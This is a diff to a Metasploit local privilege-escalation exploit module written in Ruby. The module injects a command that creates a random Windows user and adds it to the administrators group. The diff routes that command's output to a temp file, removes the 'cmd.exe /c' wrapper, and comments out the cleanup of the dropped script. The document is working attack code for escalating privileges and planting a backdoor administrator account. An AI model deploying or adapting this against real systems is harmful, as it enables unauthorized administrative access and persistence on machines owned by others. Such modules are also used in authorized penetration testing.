@@ -73,7 +73,9 @@ class MetasploitModule < Msf::Exploit::Local
     password = Rex::Text.rand_text_alpha((rand(8) + 6))
     print_status("username = #{username}, password = #{password}")
     cmd_to_run = 'net user /add ' + username + ' ' + password
+    cmd_to_run += '  > C:\\\\Windows\\\\Temp\\\\testoutput.txt'
     cmd_to_run += '  & net localgroup administrators /add ' + username
+    cmd_to_run += '  >> C:\\\\Windows\\\\Temp\\\\testoutput.txt'
     print_status(cmd_to_run)
     return cmd_to_run
   end
@@ -127,6 +129,7 @@ class MetasploitModule < Msf::Exploit::Local
     script_template_data = ::IO.read(local_script_template_path)
     vprint_status("script_template_data.length =  #{script_template_data.length}")
     full_command = 'cmd.exe /c ' + cmd_to_run
+    full_command = cmd_to_run
     script_data = script_template_data.sub!('SCRIPTED_COMMAND', full_command)
     if script_data == nil
       fail_with(Failure::BadConfig, "Failed to substitute command in script_template")
@@ -158,13 +161,13 @@ class MetasploitModule < Msf::Exploit::Local
       vprint_status(command_output)
       print_good('Exploit completed, wait for elevated session')
       ensure_clean_destination(exploit_path)
-      ensure_clean_destination(script_path)
+#      ensure_clean_destination(script_path)
     rescue Rex::Post::Meterpreter::RequestError => e
       elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
       print_good('Command failed, cleaning up')
       print_error(e.message)
       ensure_clean_destination(exploit_path)
-      ensure_clean_destination(script_path)
+#      ensure_clean_destination(script_path)
     end
   end
 
